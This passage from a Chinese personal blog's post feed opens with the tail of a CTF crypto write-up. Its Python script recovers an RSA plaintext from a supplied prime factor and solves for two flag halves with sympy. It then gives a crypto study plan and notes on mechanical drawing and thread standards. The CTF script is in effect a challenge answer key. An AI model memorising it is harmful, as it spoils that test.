class="line"><span class="attribute">d</span> = int(gmpy<span class="number">2</span>.invert(e, phi))</span><br><span class="line"><span class="attribute">c1</span> = M<span class="number">1</span> = pow(C<span class="number">1</span>, d, n)</span><br><span class="line"><span class="attribute">c2</span> = M<span class="number">2</span> = pow(C<span class="number">2</span>, d, n)</span><br><span class="line"><span class="comment"># print(M1)</span></span><br><span class="line"><span class="comment">#  c1 = M1 = F1+F2 = 2732509502629189160482346120094198557857912754</span></span><br><span class="line"><span class="comment"># print(M2)</span></span><br><span class="line"><span class="comment"># c2 = M2 = (F1**3 + F2**3) = 5514544075236012543362261483183657422998274674127032311399076783844902086865451355210243586349132992563718009577051164928513093068525554</span></span><br></pre></td></tr></table></figure><ul><li><strong>求解F1、F2</strong></li></ul><p>这里，我们看到，已求出：</p><p> $c1  = F1+F2$         ———-1</p><p>$c2 = F1^{3} + F2^{3}$</p><p>其后通过将c1三次方后减去c2，得到：</p><p>${c1^{3} - c2\over 3c1} = F1F2$       ———-2</p><p>由式1、2可得F1、F2,所以下面就该<strong>解方程</strong></p><p><code>![image-20220114095336077](https://s2.loli.net/2022/01/14/Dby7tNfOvmYhJF4.png)</code></p><ul><li><p>求解二元一次方程</p><p>这里一开始想使用Sage，可惜，没用明白。</p><p>最后学习并使用了<a href="https://blog.csdn.net/weixin_36474809/article/details/104476870">sympy</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一点数学运算</span></span><br><span class="line">A = F1F2 = (<span class="built_in">pow</span>(c1, <span class="number">3</span>) - c2) // (<span class="number">3</span>*c1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二元一次方程组</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">F1 · F2 = A</span></span><br><span class="line"><span class="string">F1 + F2 = c1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x = Symbol(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Symbol(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">solved_value = solve([x * y - A, x + y - c1], [x, y])</span><br><span class="line"><span class="comment"># print(solved_value)</span></span><br><span class="line"><span class="comment"># [(1141553212031156130619789508463772513350070909, 1590956290598033029862556611630426044507841845), (1590956290598033029862556611630426044507841845, 1141553212031156130619789508463772513350070909)]</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p>可见，求出了F1、F2，这里再调试一下先后顺序，即可。</p><p>最终，代码如下</p><h4 id="代码-16"><a href="#代码-16" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2, libnum</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span></span><br><span class="line">p = <span class="number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699</span></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">C1=<span class="number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span></span><br><span class="line">C2=<span class="number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">c1 = M1 = <span class="built_in">pow</span>(C1, d, n)</span><br><span class="line">c2 = M2 = <span class="built_in">pow</span>(C2, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一点数学运算</span></span><br><span class="line">A = F1F2 = (<span class="built_in">pow</span>(c1, <span class="number">3</span>) - c2) // (<span class="number">3</span>*c1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二元一次方程组(pip install sympy)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">F1 · F2 = A</span></span><br><span class="line"><span class="string">F1 + F2 = c1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x = Symbol(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Symbol(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">solved_value = solve([x * y - A, x + y - c1], [x, y])</span><br><span class="line"></span><br><span class="line">F2 = <span class="built_in">int</span>(solved_value[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">F1 = <span class="built_in">int</span>(solved_value[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>((libnum.n2s(F1) + libnum.n2s(F2)).decode())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto学习总结与规划</title>
      <link href="/2021/12/23/Crypto%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E4%B8%8E%E8%A7%84%E5%88%92/"/>
      <url>/2021/12/23/Crypto%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E4%B8%8E%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="自我总结"><a href="#自我总结" class="headerlink" title="自我总结"></a>自我总结</h1><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>这一学期在实验室学到了很多…</p><ul><li>什么是CTF</li><li>CTF·Crypto</li><li>Markdown</li><li>TCP/IP</li><li>个人博客</li><li>……</li></ul><p>在我看来，到目前为止最大的收获反倒不是具体涨了多少知识，而是多了一种<strong>可能性</strong>，一种<strong>氛围</strong>。</p><p>不只是停留在好奇、观望的层面，实验室的存在，让我有了学习任何知识的可能与决心。</p><p>通过每次例会复盘每次学习，通过讨论、学习、打比赛（受虐阶段）大家凝聚起来，实验室提供的优秀学习环境衍生出的良好氛围让我受益匪浅，能够持续的学习下去。</p><h2 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h2><h3 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h3><ol><li><strong>方向</strong>混乱，对整个知识体系没有概念。</li><li>学习现代密码进度缓慢，<strong>安排</strong>不合理。</li><li>对当下CTF<strong>比赛所需</strong>要的能力、知识没有清晰的了解、明确的规划</li></ol><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><ol><li><strong>小组学习制度</strong>没有落实下来，与大家少了交流学习的机会</li><li>长期<strong>茫然</strong>导致学习CTF的欲望衰退</li><li>正儿八经的CTF比赛<strong>没什么产出</strong></li></ol><h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><blockquote><p>昨日，听了前CTFer、现网安从业者Xenny的<a href="https://www.bilibili.com/video/BV1MB4y1K78r">学习经历</a>，有以下启发。</p><script src="/js/youtube-autoresizer.js"></script></blockquote><iframe width="800" height="450" src="https://www.bilibili.com/video/BV1MB4y1K78r" frameborder="0" allowfullscreen></iframe><h3 id="思想层面——定位"><a href="#思想层面——定位" class="headerlink" title="思想层面——定位"></a>思想层面——定位</h3><h4 id="定位团队"><a href="#定位团队" class="headerlink" title="定位团队"></a>定位团队</h4><p>从意识上开始有正确认知，调动主观能动性。</p><p>定位学校的CTF团队的位置。</p><p>是有着科学安排、严格训练的CTF强校的强队，还是将成未成的团队？</p><p>自然，前者只需要跟着学习、训练就够。但倘若是后者，就得更多思考，对自己要有更多的要求、计划。</p><h4 id="定位自己"><a href="#定位自己" class="headerlink" title="定位自己"></a>定位自己</h4><p>知识永远有新的。</p><p>这要求我们定位出自己的位置。清晰的了解到自己的知识、能力在哪一个阶段，能解出什么题。</p><p>若是随意的、漫无目的的学，知识永远不会成体系。</p><h4 id="定位他人"><a href="#定位他人" class="headerlink" title="定位他人"></a>定位他人</h4><p>一个原则，<strong>个人发展大于团队发展。</strong></p><p>怪矛盾的一件事情</p><p>大意是：</p><p>自己可以因为热爱而为CTF全力以赴、牺牲些什么，但不能把自己的追求强加给别人。</p><p>尊重他人的选择。</p><h3 id="执行层面——积累"><a href="#执行层面——积累" class="headerlink" title="执行层面——积累"></a>执行层面——积累</h3><blockquote><p>同时针对<strong>寒假</strong>与未来<strong>在校的CTF学习</strong></p></blockquote><h4 id="积累原理"><a href="#积累原理" class="headerlink" title="积累原理"></a>积累原理</h4><p>勤奋<strong>抓底层逻辑</strong></p><p>对于新鲜事物的学习，不以利用为最终目标，要知其所以然，多解释为什么。</p><p>这样，才能做到量变引起质变，才能有所突破。</p><h4 id="积累内容"><a href="#积累内容" class="headerlink" title="积累内容"></a>积累内容</h4><p>找到方向一致的伙伴，成立方向定位足够准确的小组，<strong>落实小组学习</strong>。</p><p>小组定好学习目标，每周进行出题交互，交换思路。</p><p>Github开仓库/BBS，对每周每月的小组学习内容进行存贮。</p><p>最后所有方向的小组学习内容汇总，方便组员复习，后人学习。</p><p>每一学期复盘会清楚地知道学了些什么，有什么可以改进的地方。</p><h4 id="积累经验"><a href="#积累经验" class="headerlink" title="积累经验"></a>积累经验</h4><p>积极参与各大赛事，<strong>做题认认真真地做</strong>，复盘必不可少。</p><p> 关于复盘，要求个人写出详细的Wp，，最后与各大博客的、官方的对比学习，针对弱题目，再对此进行复盘。</p><h1 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h1><h2 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h2><p>《数论》</p><p>《近世代数基础》</p><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><p>《CTF特训营》</p><p>《密码学原理与应用》</p><p><a href="https://ctf-wiki.org/crypto/introduction/">CTF·Wiki·Crypto</a></p><p><a href="https://www.zhihu.com/question/36289177/answer/70140709">一个月入门密码训练</a></p><p>（完）</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机械制图拾遗</title>
      <link href="/2021/12/21/%E6%9C%BA%E6%A2%B0%E5%88%B6%E5%9B%BE%E6%8B%BE%E9%81%97/"/>
      <url>/2021/12/21/%E6%9C%BA%E6%A2%B0%E5%88%B6%E5%9B%BE%E6%8B%BE%E9%81%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><blockquote><p>电子书籍<br><a href="http://r4ay0wyvy.hn-bkt.clouddn.com/%E6%9C%BA%E6%A2%B0%E5%88%B6%E5%9B%BE%E8%AF%BE%E6%9C%AC.pdf">机械制图课本</a></p><p>在线课程<br><a href="https://www.bilibili.com/video/BV1FA411i7v4">【清华大学】机械制图 58集全</a></p></blockquote><hr><h1 id="剖视图"><a href="#剖视图" class="headerlink" title="剖视图"></a>剖视图</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><ol><li><p><strong>剖视图</strong><br>假想用剖切面剖开机件, 将观察者与剖切面之间部分移去, 而将其余部分向投影面投影所得图形, 称为剖视图, 简称剖视.</p><p><img src="https://s2.loli.net/2021/12/20/X29BVguE3ivto8W.png" alt="image-20211220191428539"></p></li><li><p>剖面符号</p></li><li><p><strong>剖视图的标注</strong></p><p>画剖视图时, 一般应在相应视图上画出剖切位置, <strong>箭头</strong>指明投影方向, 标注大写字母表示 剖视图名称。同时在相应剖视图上方注写相同的字母<strong>“× —× ”</strong>.</p><ul><li><p><strong>省略箭头</strong></p><p>当<strong>剖视图按投影关系配置, 中间又没有其他视图隔开</strong>时, 可<strong>省略箭头</strong>, 如图 2. 100 的 A—A全剖左视图。</p><p><img src="https://s2.loli.net/2021/12/20/s1f4qu5y8aALdp6.png" alt="image-20211220192050596"></p></li><li><p><strong>省略所有标注</strong></p><p>当<strong>单一剖切面</strong>通过机件的<strong>对称面或基本对称平面</strong>, 且剖视图按<strong>投影关系配置</strong>, 中间无其他视图隔开时, 可省略标注, 如图 2. 100 的全剖主视图。</p></li></ul></li><li><p>剖视图分类</p><ul><li><p>全剖视图</p></li><li><p>半剖视图</p><ul><li><ol><li>一半外形视图与一半剖视图以<strong>对称中心线</strong>分界, 不能画成粗实线。 </li><li>在一半外形视图中, <strong>不用画出</strong>已经在<strong>另一半</strong>剖视图中<strong>已表示清楚的内部形状</strong>。 </li><li>半剖视图的标注方法与全剖视图相同。</li></ol></li></ul></li><li><p>局部剖试图</p><ol><li>局部剖视图以波浪线为分界线; 剖切位置和剖切范围的大小视需要而定。</li><li>局部剖视图的标注与前两种剖视图相同。</li></ol><p><img src="https://s2.loli.net/2021/12/20/MjkFrmzy1vb3s6N.png" alt="image-20211220195536521"></p></li></ul></li><li><p>剖切面</p><ul><li>单一剖切面</li><li>几个平行的剖切平面</li><li>几个相交的剖切面</li></ul></li></ol></blockquote><h1 id="断面图"><a href="#断面图" class="headerlink" title="断面图"></a>断面图</h1><hr><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><blockquote><p>假想用剖切面将机件的某处截断, 仅画出该剖切面与机件接触部分的图形, 称为断面图, 简称断面</p></blockquote><h2 id="画法"><a href="#画法" class="headerlink" title="画法"></a>画法</h2><blockquote><p><strong>省略不必要</strong>的，<strong>突出所断</strong>的。</p></blockquote><p><img src="https://s2.loli.net/2021/12/20/2VNkcvQIdGF9hRE.png" alt="image-20211220195809322"></p><hr><h1 id="技术要求"><a href="#技术要求" class="headerlink" title="技术要求"></a>技术要求</h1><script src="/js/youtube-autoresizer.js"></script><iframe width="800" height="450" src="https://www.bilibili.com/video/BV1FA411i7v4?p=44" frameborder="0" allowfullscreen></iframe><p><strong>注：</strong>对应<strong>P44、P45</strong></p><h2 id="表面结构"><a href="#表面结构" class="headerlink" title="表面结构"></a>表面结构</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p><img src="https://s2.loli.net/2021/12/21/vGzVKN3LkjMXr6I.png" alt="image-20211221170535398"></p><ul><li>粗糙度轮廓： 量化<strong>微观角度看到的不平整</strong></li><li>波纹度轮廓：量化<strong>周期性的误差</strong>（🤔</li><li>形状轮廓：量化<strong>宏观角度的不平</strong></li></ul><p><strong>注：课本中以粗糙度为主要讨论对象</strong></p><h3 id="表面粗糙度"><a href="#表面粗糙度" class="headerlink" title="表面粗糙度"></a>表面粗糙度</h3><blockquote><p>用到两参数$ R_a$（轮廓算数平均偏差）与$R_z$(轮廓最大高度)</p></blockquote><h4 id="R-a-（单位：μm）"><a href="#R-a-（单位：μm）" class="headerlink" title="$R_a$（单位：μm）"></a>$R_a$（单位：μm）</h4><blockquote><p>粗糙的有上有下，取它们距离<strong>基准线（零线）</strong>的距离求平均值，得到数值可画出一条假想的线。</p></blockquote><p><img src="https://s2.loli.net/2021/12/21/rT8siquZ4aAjUnh.png" alt="image-20211221173204704"></p><h4 id="R-z"><a href="#R-z" class="headerlink" title="$R_z$"></a>$R_z$</h4><blockquote><p>最上与最下的距离，即极差。</p></blockquote><p><img src="https://s2.loli.net/2021/12/21/iC2XMRF3UNTfyBY.png" alt="image-20211221172253318"></p><h3 id="标注符号"><a href="#标注符号" class="headerlink" title="标注符号"></a>标注符号</h3><p><img src="https://s2.loli.net/2021/12/21/Ys3cxwltXEm4AW7.png" alt="image-20211221174904720"></p><p><strong>注：</strong>截止此处，表面粗糙度仍未有所展现。</p><p><strong>完整结构</strong>：</p><p><img src="https://s2.loli.net/2021/12/21/VjGlsmKzFa8BAiP.png" alt="image-20211221175313146"></p><p><img src="https://s2.loli.net/2021/12/21/aViFxt9rAMJbl7T.png" alt="image-20211221175442412"></p><p><strong>注：</strong>小圆圈代表周遭封闭轮廓配置一致，便省略其余的标注。</p><h3 id="图样上的标注"><a href="#图样上的标注" class="headerlink" title="图样上的标注"></a>图样上的标注</h3><h4 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h4><ul><li>表面只标注一次，井尽量标在相应尺寸及其公差的同一视图上</li><li>标注在可见轮廓线、尺寸线、尺寸界线或它们的延长线上</li><li>符号应从材料外指向井接触表面（类比加工刀🔪，从外削）</li><li>注写和读取方向与尺寸的注写和读取方向一致</li></ul><h4 id="简化标注"><a href="#简化标注" class="headerlink" title="简化标注"></a>简化标注</h4><p><img src="https://s2.loli.net/2021/12/21/xeQlTjJCkVp1HiZ.png" alt="image-20211221180716315"></p><blockquote><p>理解为，<strong>未标注</strong>的粗糙度都是括号外的。</p></blockquote><h3 id="尺寸结构与公差"><a href="#尺寸结构与公差" class="headerlink" title="尺寸结构与公差"></a>尺寸结构与公差</h3><blockquote><p>为了使得批量生产的同样的零件不至于因为制作的误差导致无法起到同样的功能，这里作出要求。</p></blockquote><h4 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h4><blockquote><p>限制零件功能尺寸的极限范围。</p></blockquote><h5 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h5><p><img src="https://s2.loli.net/2021/12/21/6SeBYZP5W2H1RCo.png" alt="image-20211221182238355"></p><p><img src="https://s2.loli.net/2021/12/21/QEakpUdzTxFRCbM.png" alt="image-20211221183307106"></p><ul><li>基本尺寸</li><li>上偏差</li><li>下偏差</li><li>极限偏差</li><li>尺寸公差（公差）</li></ul><p><img src="https://s2.loli.net/2021/12/21/2JBYdjwzO5KUefr.png" alt="image-20211221183639431"></p><ul><li>公差带</li><li>公差带图</li></ul><h4 id="标准公差与基本偏差"><a href="#标准公差与基本偏差" class="headerlink" title="标准公差与基本偏差"></a>标准公差与基本偏差</h4><p><img src="https://s2.loli.net/2021/12/21/mbl8t9EJW5YAU1g.png" alt="image-20211221184052931"></p><ul><li><strong>标准公差</strong>——定公差带宽——公差带宽度</li><li><strong>基本偏差</strong>——定公差带位置 ——与靠近的（上/下）偏差的距离</li></ul><p><img src="https://s2.loli.net/2021/12/21/J4M7PuWYBLZH1N3.png" alt="image-20211221184253060"></p><p><img src="https://s2.loli.net/2021/12/21/OqhAut23mBeigw8.png" alt="image-20211221190440194"></p><h5 id="公差带代号"><a href="#公差带代号" class="headerlink" title="公差带代号"></a>公差带代号</h5><p><img src="https://s2.loli.net/2021/12/21/xHXwD8eqMEcr1as.png" alt="image-20211221190742870"></p><h5 id="标注"><a href="#标注" class="headerlink" title="标注"></a>标注</h5><blockquote><ol><li>直接写公差带代号</li><li>写代号的所表达的（<strong>不用括号</strong>），<strong>不写代号</strong>本身</li><li>代号 + 含义 （<strong>用括号</strong>）</li></ol></blockquote><p><img src="https://s2.loli.net/2021/12/21/npBNKGuwIZd8LHU.png" alt="image-20211221191129085"></p><h3 id="配合"><a href="#配合" class="headerlink" title="配合"></a>配合</h3><p><img src="https://s2.loli.net/2021/12/21/zhbtoDg6Fjfv3Vx.png" alt="image-20211221191737823"></p><ul><li>间隙配合</li><li>过盈配合</li><li>过渡配合</li></ul><h4 id="配合制"><a href="#配合制" class="headerlink" title="配合制"></a>配合制</h4><ul><li>基孔制（孔的基本偏差固定为H，轴变）</li><li>基轴制（轴的基本偏差固定为h，孔变）</li></ul><blockquote><p>所以谁孔/轴的代号中，<strong>谁出现了H/h，就是基于谁的。</strong></p></blockquote><h4 id="标注-1"><a href="#标注-1" class="headerlink" title="标注"></a>标注</h4><p><img src="https://s2.loli.net/2021/12/21/YcbQeKV5Lz714IA.png" alt="image-20211221192608411"></p><p>注：</p><ul><li><p><strong>孔</strong>是<strong>大写</strong>字母，H左边都在零线<strong>上面</strong>。</p></li><li><p><strong>轴</strong>是<strong>小写</strong>字母，h左边都在零线<strong>下面</strong>。</p></li></ul><h5 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h5><p><img src="https://s2.loli.net/2021/12/21/2Yj6oUNIsl8pPuE.png" alt="image-20211221193617804"></p><h3 id="几何公差"><a href="#几何公差" class="headerlink" title="几何公差"></a>几何公差</h3><blockquote><p><strong>量化形状误差</strong></p></blockquote><h4 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念<img src="https://s2.loli.net/2021/12/21/WOba4fcvmeZgxV1.png" alt="image-20211221194925113"></h4><h4 id="分类及特征符号"><a href="#分类及特征符号" class="headerlink" title="分类及特征符号"></a>分类及特征符号</h4><p><img src="https://s2.loli.net/2021/12/21/CMIOuUY3RPNWo5k.png" alt="image-20211221195154307"></p><ul><li>直线度 </li><li>平面度</li><li>圆度</li><li>圆柱度</li><li>平行度</li><li>垂直度</li><li>倾斜度</li><li>位置度</li><li>同心度 | 同轴度</li><li>对称度</li><li>线\面轮廓度</li><li>圆跳动、全跳动</li></ul><h4 id="标注-2"><a href="#标注-2" class="headerlink" title="标注"></a>标注</h4><p><img src="https://s2.loli.net/2021/12/21/6aU3jAqyOXngNeh.png" alt="image-20211221195808191"></p><blockquote><p>基本的，用<strong>方框</strong>框住内容。</p><p>细致的说来，依次为<strong>几何特征符号</strong>、<strong>公差值</strong>（、<strong>基准</strong>）</p></blockquote><h4 id="标注-3"><a href="#标注-3" class="headerlink" title="标注"></a>标注</h4><p><img src="https://s2.loli.net/2021/12/21/ZdUfqsVmOLihTzl.png" alt="image-20211221200827532"></p><h3 id="技术要求-1"><a href="#技术要求-1" class="headerlink" title="技术要求"></a>技术要求</h3><p><img src="https://s2.loli.net/2021/12/21/S3wfpO8zsyV6Bij.png" alt="image-20211221202800246"></p><hr><h1 id="螺纹"><a href="#螺纹" class="headerlink" title="螺纹"></a>螺纹</h1><h2 id="画法-1"><a href="#画法-1" class="headerlink" title="画法"></a>画法</h2><h3 id="线的粗细"><a href="#线的粗细" class="headerlink" title="线的粗细"></a>线的粗细</h3><blockquote><p>🤔事实上，能<strong>摸到凹凸不平的</strong>用<strong>粗实线</strong>。</p></blockquote><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>细线<ul><li><strong>小径</strong>（牙底线）<strong>画入倒角</strong> 即：细线画入倒角</li><li>细线<strong>四分之三圆</strong></li></ul></li><li>倒角圆，不画！</li></ul><p><img src="https://s2.loli.net/2021/12/22/eOgW3mrn4Ai9Y2B.png" alt="image-20211222101030133"></p><h2 id="代号及标注"><a href="#代号及标注" class="headerlink" title="代号及标注"></a>代号及标注</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcevKHfHQkXWJRVP3dRqxZp*9E6bsuEFCVnR8hUeJuIWesnskmx8pmxm0GnopWh3TVT7sEh66A99ys.89aN9vBfo!/b&bo=owQ4BAAAAAADd8k!&rf=viewer_4" alt="img"></p><h3 id="普通螺纹"><a href="#普通螺纹" class="headerlink" title="普通螺纹"></a>普通螺纹</h3><h4 id="标记内容"><a href="#标记内容" class="headerlink" title="标记内容"></a>标记内容</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">螺纹代号 - 螺纹公差带代号 - 旋合长度代号 - 旋向</span><br></pre></td></tr></table></figure><h4 id="螺纹代号"><a href="#螺纹代号" class="headerlink" title="螺纹代号"></a>螺纹代号</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">螺纹特征代号M公称直径 ✖️ 螺距</span><br></pre></td></tr></table></figure><blockquote><p><strong>粗牙普通螺纹</strong>的<strong>螺距省略</strong></p></blockquote><h4 id="螺纹公差带代号"><a href="#螺纹公差带代号" class="headerlink" title="螺纹公差带代号"></a>螺纹公差带代号</h4><blockquote><p>包括<strong>中径公差带代号</strong>和<strong>顶径公差带代号</strong>。<br>而公差带代号由<strong>公差等级数字</strong>和<strong>基本偏差字母</strong>组成。<br>其中，字母<strong>小</strong>写表示<strong>外</strong>螺纹，<strong>大</strong>写表示<strong>内</strong>螺纹<br>若中/顶径公差带代号一致则只写一次</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">M20</span>-<span class="number">5</span>g<span class="number">6</span>g、M<span class="number">20</span>-<span class="number">6</span>g</span><br></pre></td></tr></table></figure><h4 id="旋合长度代号"><a href="#旋合长度代号" class="headerlink" title="旋合长度代号"></a>旋合长度代号</h4><blockquote><p> 螺纹旋合长度是指两个相互旋合的螺纹，沿螺纹轴线方向相互联接的长度。</p><p> 普通螺纹旋合长度有<strong>短（S)、中（N)、长（L）</strong>三组。当旋合长度为 <strong>N时，省略</strong></p></blockquote><h4 id="旋向"><a href="#旋向" class="headerlink" title="旋向"></a>旋向</h4><blockquote><p> 当螺纹为<strong>左旋</strong>时，用$ LH$ 表示；<strong>右旋</strong>螺纹旋向<strong>省略标注</strong>。</p></blockquote><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><ol><li><blockquote><p>例如，<strong>M20-5g6g-S</strong><br>表示<strong>公称直径为20mm</strong> 的<strong>粗牙普通螺纹</strong> （<strong>外螺纹</strong>），<strong>中径公差带代号</strong>为5g，<strong>顶径公差带代号</strong>为 6g，<strong>短旋合长度</strong>，<strong>右旋</strong></p></blockquote></li><li><blockquote><p>例如，<strong>M10 x1-6H-LH</strong></p><p>表示<strong>公称直径</strong>为 10mm，<strong>螺距</strong>为1mm 的<strong>细牙普通螺纹</strong>（<strong>内螺纹</strong>），<br><strong>中径和顶径公差带代号</strong>都为 6H，<strong>中等旋合长度</strong>，<strong>左旋</strong></p></blockquote></li></ol><p>这里需要注意，为什么例2是细牙普通螺纹呢？或者说，如何判断普通螺纹的粗细呢？</p><p>Baidu给出了答案。</p><blockquote><p>螺丝上相邻螺纹之间的距离叫螺距.<br>按国家标准“普通”公制螺纹上规定的螺距尺寸，生产出来的螺丝称粗牙螺丝。<br>如果是与粗牙螺丝<strong>同样的螺纹外径</strong>，而<strong>螺距小于粗牙螺距</strong>的螺纹习称<strong>细牙螺纹</strong></p></blockquote><p>粗细牙螺纹细分</p><blockquote><p>螺纹根据<strong>螺距</strong>的大小分为:粗牙螺纹和细牙螺纹，粗牙螺纹的螺距要比细牙螺纹的螺距要大,比如普通螺纹大径为24毫米,其螺距有3毫米、2毫米、1.5毫米三种,把螺距为最大3毫米的螺纹称为粗牙螺纹,而其余(2毫米和1.5毫米)的螺纹共称为细牙螺纹。</p></blockquote><h3 id="管螺纹"><a href="#管螺纹" class="headerlink" title="管螺纹"></a>管螺纹</h3><h4 id="标记内容-1"><a href="#标记内容-1" class="headerlink" title="标记内容"></a>标记内容</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">螺纹特征代号 尺寸代号 公差等级 旋向</span><br></pre></td></tr></table></figure><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><blockquote><ol><li>不同的<strong>管螺纹代号</strong>分别为<strong>G、$R_1$、$R_2$、Rc、Rp;</strong></li><li><strong>尺寸代号</strong>是指管子通径数值，不是螺纹大径；</li><li>对55°非螺纹密封的外管螺纹可标注<strong>公差等级</strong>，公差等级有<strong>A、B两级</strong>，其他管螺纹的公差等级只有一种，<strong>可省略标注</strong>；</li><li>对于旋向代号，左旋用“LH” 来注明，右旋省略标注。</li></ol></blockquote><h4 id="例子-1"><a href="#例子-1" class="headerlink" 